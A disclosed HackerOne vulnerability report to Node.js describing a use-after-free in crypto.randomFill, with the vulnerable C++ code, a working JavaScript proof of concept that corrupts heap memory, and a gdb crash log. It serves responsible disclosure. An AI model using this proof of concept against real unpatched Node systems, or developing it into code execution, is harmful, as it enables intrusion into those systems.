# Use After Free in crypto.randomFill

## Report Details
- **Report ID**: 340053
- **URL**: https://hackerone.com/reports/340053
- **State**: Closed
- **Severity**: N/A
- **Submitted**: 2018-04-18T12:38:05.607Z
- **Disclosed**: 2020-01-15T02:00:32.927Z

## Reporter
- **Username**: tunz
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: nodejs

## Vulnerability Information
**Summary:**

We can trigger Use-After-Free while running crypto.randomFill, so we can easily read/write heap memory using a typed array pointing a freed backing store.

**Description:**

See this `node_crypto.cc` code.
```pp
void RandomBytesBuffer(const FunctionCallbackInfo<Value>& args) {
...
  char* data = Buffer::Data(args[0]); // <------------ Get a backing store from a given argument.
  data += offset;

  std::unique_ptr<RandomBytesRequest> req(
      new RandomBytesRequest(env,
                             obj,
                             size,
                             data,     // <--------------------- Store the data to req
                             RandomBytesRequest::DONT_FREE_DATA));
...
  } else {
    Local<Value> argv[2];
    RandomBytesProcessSync(env, std::move(req), &argv); // <---- This calls RandomBytesCheck
...
```

```pp
void RandomBytesCheck(RandomBytesRequest* req, Local<Value> (*argv)[2]) {
...
    char* data = nullptr;
    size_t size;
    req->return_memory(&data, &size);
    (*argv)[0] = Null(req->env()->isolate());
    Local<Value> buffer =
        req->object()->Get(req->env()->context(),
                           req->env()->buffer_string()).ToLocalChecked(); // <----- We can return a non-buffer object here by modifying Object.prototype getter.

    if (buffer->IsArrayBufferView()) {
      ...
    } else {
      (*argv)[1] = Buffer::New(req->env(), data, size) // <------- This creates a Buffer with the backing store of a given argument Buffer.
          .ToLocalChecked();
...
```

As a result, two buffers are sharing a backing store, so this triggers use-after-free if one of the buffers are freed by gc.

## Steps To Reproduce:

Execute the following code.

```js
const crypto = require('crypto');

Object.defineProperty(Object.prototype, "buffer", {
  get: function() {
    return {}; // Return a non-buffer.
  }, set: function(v) {
  }
});

let size = 100000;
let ta = new Uint8Array(size);
crypto.randomFillSync(ta, 0, size);

// Actually we don't need this part, this makes a buffer free and crashes just for PoC
let arr_size = 10000;
let arrs = new Array(arr_size);
for (let i = 0; i <arr_size; i++) {
  let tmp = new Array(0x500);
  arrs[i] = tmp;
}

// Just overwrites heap memory space to 0x41
for (let i = 0; i < size; i++) {
  ta[i] = 0x41;
}
```

```
$ ./out/Release/node --version
v9.11.1
$ gdb -q --args ./out/Release/node randombytes.js
Reading symbols from ./out/Release/node...r
done.
(gdb) r
Starting program: /.../ randombytes.js
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
[New Thread 0x7fcd52464700 (LWP 34515)]
[New Thread 0x7fcd51c63700 (LWP 34516)]
[New Thread 0x7fcd51462700 (LWP 34520)]
[New Thread 0x7fcd50c61700 (LWP 34522)]
[New Thread 0x7fcd5391d700 (LWP 34529)]

Thread 1 "node" received signal SIGSEGV, Segmentation fault.
_int_malloc (av=av@entry=0x7fcd52829b20 <main_arena>, bytes=bytes@entry=8192) at malloc.c:3567
3567    malloc.c: No such file or directory.
(gdb) x/i $pc
=> 0x7fcd524e6f04 <_int_malloc+900>:    mov    rdx,QWORD PTR [rax+0x8]
(gdb) i r rax
rax            0x4141414141414141       4702111234474983745
(gdb)
```

I've tested this in node v9.11.1 built with clang in Ubuntu 16.04.3, and also reproducible in the master branch at the time of writing this report.

## Impact

This vulnerability could lead to Remote Code Execution.

## Attachments
No attachments
